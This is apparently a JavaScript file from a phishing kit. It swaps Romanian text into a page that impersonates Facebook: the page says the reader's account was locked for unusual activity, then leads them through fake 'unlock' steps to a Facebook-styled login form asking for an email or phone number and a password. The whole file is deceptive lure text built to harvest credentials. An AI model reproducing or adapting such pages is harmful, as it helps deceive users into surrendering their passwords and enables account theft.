var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");


mainHeader.innerHTML ="Contul tau a fost inchis";
mainParagraph.innerHTML ="Am văzut activitate neobișnuită în contul dvs. Acest lucru poate însemna că cineva v-a folosit contul fără știrea dvs.";
lockedHeader.innerHTML ="Cont blocat pe 10 noiembrie 2021";
lockedParagraph.innerHTML ="Pentru a vă proteja, profilul dvs. nu este vizibil pentru persoanele de pe Facebook și nu vă puteți folosi contul.";
footerParagraph.innerHTML ="Vă vom ghida prin câțiva pași pentru a vă debloca contul.";
getStarted.innerHTML ="Incepe";
nextHeader.innerHTML ="Cum să vă deblocați contul";
fristLineHeader.innerHTML ="Confirmați că acesta este contul dvs";
fristLineParagraph.innerHTML ="Deoarece este posibil ca altcineva să fi avut acces, trebuie să confirmăm că sunteți proprietarul acestui cont înainte de a merge mai departe.";
secoundLineHeader.innerHTML ="Asigurați-vă detaliile de conectare";
thirdLineHeader.innerHTML ="Contul dvs. va fi deblocat";
nextButton.innerHTML ="Următorul";
backButton.innerHTML ="Înapoi";
logHeading.innerHTML ="Conectați-vă la Facebook";
logAlert.innerHTML ="Mai întâi trebuie să vă autentificați";
logAlert2.innerHTML ="Mai întâi trebuie să vă autentificați";
userInput.setAttribute("placeholder" , "Adresă de e-mail sau număr de telefon");
passInput.setAttribute("placeholder" , "Parola");
logButton.innerHTML ="Autentificare";
or.innerHTML ="sau";
createButton.innerHTML ="Creează un cont nou";
